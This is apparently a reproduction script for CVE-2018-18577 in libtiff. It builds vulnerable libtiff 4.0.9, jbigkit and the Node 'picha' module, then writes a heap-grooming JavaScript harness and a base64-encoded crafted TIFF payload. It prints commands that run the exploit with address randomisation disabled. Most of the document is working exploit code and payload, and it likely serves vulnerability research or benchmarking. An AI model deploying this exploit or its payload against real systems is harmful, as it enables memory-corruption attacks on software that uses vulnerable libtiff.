#!/bin/bash

if [ -z "${CVE_2018_18577}"] ]; then
    echo ERROR: environment variable "CVE_2018_18577" not set
    exit -1
fi

if [ -d "${CVE_2018_18577}" ]; then
    echo ERROR: directory ${CVE_2018_18577} exists, please delete
    exit -1
fi


echo Creating CVE-2018-18577 at ${CVE_2018_18577}

mkdir ${CVE_2018_18577}
cd ${CVE_2018_18577}


# Make jbig
git clone https://www.cl.cam.ac.uk/~mgk25/git/jbigkit
cd jbigkit
make V=1 -j 10
cd $CVE_2018_18577

# Make tiff
git clone https://gitlab.com/libtiff/libtiff.git
cd libtiff
git checkout Release-v4-0-9
./autogen.sh
CFLAGS="-I$CVE_2018_18577/jbigkit/libjbig" CXXFLAGS=$CFLAGS LDFLAGS="-L$CVE_2018_18577/jbigkit/libjbig" ./configure  --prefix=$CVE_2018_18577/build
make V=1 -j 10 install


# Build picha
cd $CVE_2018_18577
git clone https://github.com/jhs67/picha

PATH=/bpjs/bpjs/vanilla_node/node_install/bin:$PATH /bpjs/bpjs/vanilla_node/node_install/bin/npm install nan --verbose
PATH=/bpjs/bpjs/vanilla_node/node_install/bin:$PATH PKG_CONFIG_PATH=$CVE_2018_18577/build/lib/pkgconfig /bpjs/bpjs/vanilla_node/node_install/bin/npm build --verbose picha


cat > ${CVE_2018_18577}/picha/jbig.js  <<EOF
var fs = require('fs');
var path = require('path');
var assert = require('assert');
var picha = require('.');


let ts = []
let ps = []

// Seems to work more reliable if we allocate a bunch 
for (let i = 0; i < 100; i++) {
    ts[i] = new Uint8Array(2222);    
    ps[i] = new Uint8Array(1087);    
}

// Two big mallocs
var big1 = new Uint8Array(1048576);
var big2 = new Uint8Array(1048576);

// Create desired sized chunks with allocated inbetween to prevent
// coalscing
// allocate buffer first then tif so buffer will be above
// tif in memory
var b1 = new Uint8Array(2222);
var a1 = new Uint8Array(2222);
var a2 = new Uint8Array(1087);
var b3 = new Uint8Array(2222);

var rest    = new Uint8Array(555);

// free data chunk, then the tif chunk so 
a1 = null;
a2 = null;

// hopefully any other mallocs will use this
rest   = null;

// get OS to acutally free memory
global.gc(true);

// Load exploit image
var syncImage = picha.decodeTiffSync(fs.readFileSync("jbig-crash.tif"));

EOF

base64 -d <<TIFF > ${CVE_2018_18577}/picha/jbig-crash.tif
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
AAAAAAAA
TIFF

echo "
This command will run the exploit:

cd $CVE_2018_18577/picha
PATH=/bpjs/bpjs/vanilla_node/node_install/bin:\$PATH LD_LIBRARY_PATH=$CVE_2018_18577/build/lib setarch `uname -m` -R node --expose-gc ./jbig.js


This command will make sure you don't pick up old files:


cd $CVE_2018_18577/picha
rm -f /tmp/require-security-bjpeg.txt && PATH=/bpjs/bpjs/vanilla_node/node_install/bin:\$PATH LD_LIBRARY_PATH=$CVE_2018_18577/build/lib setarch `uname -m` -R node --expose-gc ./jbig.js || ls -l /tmp/require-security-bjpeg.txt
"
